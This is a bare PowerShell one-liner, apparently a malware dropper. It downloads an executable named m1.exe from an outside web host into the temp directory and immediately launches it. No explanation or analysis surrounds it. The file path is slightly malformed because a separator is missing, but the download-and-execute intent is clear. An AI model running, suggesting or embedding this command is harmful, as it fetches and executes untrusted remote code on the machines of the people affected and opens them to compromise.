(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/m/m1.exe',"$env:TEMPm1.exe");Start-Process ("$env:TEMPm1.exe")